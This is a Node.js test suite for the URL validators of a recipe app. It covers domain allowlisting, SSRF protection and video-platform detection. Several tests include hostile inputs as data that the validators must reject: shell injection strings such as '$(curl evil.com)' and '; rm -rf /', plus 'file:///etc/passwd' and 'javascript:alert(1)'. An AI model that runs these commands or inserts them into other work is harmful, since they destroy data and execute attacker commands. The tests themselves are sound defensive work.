/**
 * URL Validation tests using Node.js built-in test runner
 * Run with: node --test
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');

const {
    validateUrl,
    isVideoUrl,
    sanitizeVideoUrl,
    getVideoPlatform,
    ALLOWED_RECIPE_DOMAINS
} = require('../../utils/validation');

describe('URL Validation', () => {
    describe('validateUrl', () => {
        it('should accept valid chefkoch.de URLs', () => {
            const url = 'https://www.chefkoch.de/rezepte/12345';
            assert.strictEqual(validateUrl(url), url);
        });

        it('should accept valid allrecipes.com URLs', () => {
            const url = 'https://www.allrecipes.com/recipe/12345/spaghetti';
            assert.strictEqual(validateUrl(url), url);
        });

        it('should accept HTTP URLs from allowed domains', () => {
            const url = 'http://chefkoch.de/rezepte/12345';
            assert.strictEqual(validateUrl(url), url);
        });

        it('should reject invalid URL format', () => {
            assert.throws(() => validateUrl('not-a-url'), /Invalid URL format/);
        });

        it('should reject non-HTTP/HTTPS protocols', () => {
            assert.throws(() => validateUrl('ftp://chefkoch.de/file'), /Only HTTP and HTTPS protocols are allowed/);
            assert.throws(() => validateUrl('file:///etc/passwd'), /Only HTTP and HTTPS protocols are allowed/);
            assert.throws(() => validateUrl('javascript:alert(1)'), /Only HTTP and HTTPS protocols are allowed/);
        });

        it('should reject domains not in allowlist', () => {
            assert.throws(() => validateUrl('https://evil.com/malware'), /not in the list of allowed/);
            assert.throws(() => validateUrl('https://localhost/admin'), /not in the list of allowed/);
            assert.throws(() => validateUrl('https://192.168.1.1/internal'), /not in the list of allowed/);
            assert.throws(() => validateUrl('https://127.0.0.1:8080/api'), /not in the list of allowed/);
        });

        it('should reject internal/private IP addresses', () => {
            assert.throws(() => validateUrl('http://10.0.0.1/secret'), /not in the list of allowed/);
            assert.throws(() => validateUrl('http://172.16.0.1/admin'), /not in the list of allowed/);
        });

        it('should handle URLs with query parameters', () => {
            const url = 'https://www.chefkoch.de/rezepte/12345?print=true&lang=de';
            assert.strictEqual(validateUrl(url), url);
        });

        it('should handle URLs with fragments (fragments are stripped as they are not sent to server)', () => {
            const url = 'https://www.chefkoch.de/rezepte/12345#ingredients';
            assert.strictEqual(validateUrl(url), 'https://www.chefkoch.de/rezepte/12345');
        });
    });

    describe('ALLOWED_RECIPE_DOMAINS', () => {
        it('should contain expected German recipe sites', () => {
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('chefkoch.de'));
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('www.chefkoch.de'));
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('eatsmarter.de'));
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('lecker.de'));
        });

        it('should contain expected international recipe sites', () => {
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('allrecipes.com'));
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('bbcgoodfood.com'));
            assert.ok(ALLOWED_RECIPE_DOMAINS.includes('epicurious.com'));
        });

        it('should have both www and non-www versions', () => {
            const nonWwwDomains = ALLOWED_RECIPE_DOMAINS.filter(d => !d.startsWith('www.'));
            nonWwwDomains.forEach(domain => {
                assert.ok(ALLOWED_RECIPE_DOMAINS.includes(`www.${domain}`));
            });
        });

        it('should accept URLs whose hostname is an allowed recipe domain', () => {
            const url = 'https://www.allrecipes.com/recipe/12345/delicious-food';
            // validateUrl should base its decision on the parsed hostname, not substring matches
            assert.strictEqual(validateUrl(url), url);
        });

        it('should reject URLs where an allowed domain only appears as a substring in the hostname', () => {
            const evilHostUrls = [
                'https://allrecipes.com.evil.com/recipe/12345',
                'https://evil-allrecipes.com/recipe/12345'
            ];

            evilHostUrls.forEach(url => {
                assert.throws(() => validateUrl(url));
            });
        });
    });
});

describe('Video URL Validation', () => {
    describe('isVideoUrl', () => {
        it('should recognize TikTok URLs', () => {
            assert.strictEqual(isVideoUrl('https://www.tiktok.com/@user/video/123'), true);
            assert.strictEqual(isVideoUrl('https://vm.tiktok.com/abc123'), true);
            assert.strictEqual(isVideoUrl('http://tiktok.com/video'), true);
        });

        it('should recognize Instagram Reels', () => {
            assert.strictEqual(isVideoUrl('https://www.instagram.com/reel/ABC123'), true);
            assert.strictEqual(isVideoUrl('https://instagram.com/reel/XYZ789'), true);
            assert.strictEqual(isVideoUrl('https://www.instagram.com/p/POST123'), true);
        });

        it('should recognize Pinterest pins', () => {
            assert.strictEqual(isVideoUrl('https://www.pinterest.com/pin/123456'), true);
            assert.strictEqual(isVideoUrl('https://pinterest.de/pin/789'), true);
        });

        it('should recognize YouTube Shorts', () => {
            assert.strictEqual(isVideoUrl('https://www.youtube.com/shorts/ABC123'), true);
            assert.strictEqual(isVideoUrl('https://youtube.com/shorts/XYZ'), true);
            assert.strictEqual(isVideoUrl('https://youtu.be/shortid'), true);
        });

        it('should reject non-video URLs', () => {
            assert.strictEqual(isVideoUrl('https://www.google.com'), false);
            assert.strictEqual(isVideoUrl('https://chefkoch.de/rezepte'), false);
            assert.strictEqual(isVideoUrl('https://instagram.com/profile'), false);
            assert.strictEqual(isVideoUrl('https://youtube.com/watch?v=123'), false);
        });
    });

    describe('sanitizeVideoUrl', () => {
        it('should return sanitized URL for valid video URLs', () => {
            const url = 'https://www.tiktok.com/@user/video/123';
            assert.strictEqual(sanitizeVideoUrl(url), url);
        });

        it('should return null for invalid URLs', () => {
            assert.strictEqual(sanitizeVideoUrl('not-a-url'), null);
            assert.strictEqual(sanitizeVideoUrl(''), null);
        });

        it('should return null for non-HTTP protocols', () => {
            assert.strictEqual(sanitizeVideoUrl('ftp://tiktok.com/video'), null);
            assert.strictEqual(sanitizeVideoUrl('file:///video.mp4'), null);
        });

        it('should return null for non-video platform URLs', () => {
            assert.strictEqual(sanitizeVideoUrl('https://evil.com/malware'), null);
            assert.strictEqual(sanitizeVideoUrl('https://localhost:8080/api'), null);
        });

        it('should prevent command injection attempts', () => {
            assert.strictEqual(sanitizeVideoUrl('$(curl evil.com)'), null);
            assert.strictEqual(sanitizeVideoUrl('`whoami`'), null);
            assert.strictEqual(sanitizeVideoUrl('; rm -rf /'), null);
            assert.strictEqual(sanitizeVideoUrl('https://evil.com/$(whoami)'), null);
        });
    });

    describe('getVideoPlatform', () => {
        it('should identify TikTok', () => {
            assert.strictEqual(getVideoPlatform('https://www.tiktok.com/@user/video/123'), 'tiktok');
            assert.strictEqual(getVideoPlatform('https://vm.tiktok.com/abc'), 'tiktok');
        });

        it('should identify Instagram', () => {
            assert.strictEqual(getVideoPlatform('https://www.instagram.com/reel/ABC'), 'instagram');
        });

        it('should identify Pinterest', () => {
            assert.strictEqual(getVideoPlatform('https://pinterest.com/pin/123'), 'pinterest');
        });

        it('should identify YouTube', () => {
            assert.strictEqual(getVideoPlatform('https://youtube.com/shorts/abc'), 'youtube');
            assert.strictEqual(getVideoPlatform('https://youtu.be/xyz'), 'youtube');
        });

        it('should return unknown for unrecognized URLs', () => {
            assert.strictEqual(getVideoPlatform('https://google.com'), 'unknown');
            assert.strictEqual(getVideoPlatform('invalid'), 'unknown');
        });
    });
});
